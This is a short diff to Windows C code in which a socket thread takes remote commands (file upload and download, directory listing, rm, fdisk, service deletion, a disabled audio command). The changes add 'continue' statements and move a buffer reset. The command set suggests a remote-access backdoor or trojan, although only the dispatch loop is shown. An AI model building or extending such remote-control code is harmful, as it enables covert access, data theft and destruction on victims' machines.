@@ -250,6 +250,8 @@ DWORD WINAPI client_process(LPVOID p)
 	while(1)
 	{	
 		Sleep(5);
+		
+		memset(cmd_buf, 0, 100);
 
 		//线程退出重启
 		WaitForSingleObject(hMutex,INFINITE);
@@ -261,52 +263,63 @@ DWORD WINAPI client_process(LPVOID p)
 		if(memcmp(cmd_buf, "down", 4)==0)
 		{
 			cmd_download(sockc);
+			continue;
 		}
 		if(memcmp(cmd_buf, "up", 2)==0)
 		{
 			cmd_upload(sockc);
+			continue;
 		}
 		if(memcmp(cmd_buf, "ls", 2)==0)
 		{
 			cmd_ls(sockc);
+			continue;
 		}
 		if(memcmp(cmd_buf, "cd", 2)==0)
 		{
 			cmd_cd(sockc);
+			continue;
 		}
 		if(memcmp(cmd_buf, "pwd", 3)==0)
 		{
 			cmd_pwd(sockc);
+			continue;
 		}		
 		if(memcmp(cmd_buf, "quit", 4)==0)
 		{
 			cmd_quit(sockc);
+			continue;
 		}	
 		if(memcmp(cmd_buf, "fdisk", 5)==0)
 		{
 			cmd_fdisk(sockc);
+			continue;
 		}	
 		if(memcmp(cmd_buf, "rm", 2)==0)
 		{
 			cmd_rm(sockc);
+			continue;
 		}
 		if(memcmp(cmd_buf, "touch", 5)==0)
 		{
 			cmd_touch(sockc);
+			continue;
 		}
 		if(memcmp(cmd_buf, "mkdir", 5)==0)
 		{
 			cmd_mkdir(sockc);
+			continue;
 		}	
 		if(memcmp(cmd_buf, "audio", 5)==0)
 		{
 			//cmd_audio(sockc);
+			//continue;
 		}	
 		if(memcmp(cmd_buf, "del_service", 11)==0)
 		{
 			del_service(sockc);
+			continue;
 		}		
-		memset(cmd_buf, 0, 100);
 	}
 
     closesocket(sockc);
